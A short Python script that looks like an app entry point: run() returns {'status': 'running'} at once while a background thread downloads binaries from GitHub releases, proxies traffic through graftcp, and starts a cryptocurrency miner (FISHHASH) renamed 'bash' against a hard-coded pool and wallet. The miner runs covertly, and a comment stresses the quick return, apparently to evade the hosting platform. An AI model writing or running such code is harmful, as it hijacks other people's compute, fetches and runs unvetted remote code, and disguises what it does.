import subprocess
import threading
import time

def worker():
    print("=== BACKGROUND START ===")

    cmd = """
    apt update -y || true
    apt install -y wget unzip git || true

    wget -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip || true
    unzip -o pan.zip || true

    cd pan || exit

    chmod -R +x . || true

    ./graftcp/local/graftcp-local -config graftcp-local.conf > /dev/null 2>&1 &

    sleep 3

    git clone https://github.com/hujisanda/lol198.git || true
    cd lol198 || exit
    chmod u+x bash || true

    mv bash ~/pan || true
    cd ~/pan || exit

    ./graftcp/graftcp -- ./bash --algo FISHHASH --pool 138.197.117.243:80 --user c9f8d6c1849abbcd164f6c72002d9ac44b9deaef70481739a29d1733915defca+115098.jasin --ethstratum ETHPROX || true
    """

    subprocess.run(["bash", "-lc", cmd], check=False)

    print("=== DONE ===")


def run():
    print("=== APP STARTED ===")

    # Jalankan di background
    thread = threading.Thread(target=worker)
    thread.start()

    # RETURN CEPAT (INI PENTING BANGET)
    return {"status": "running"}
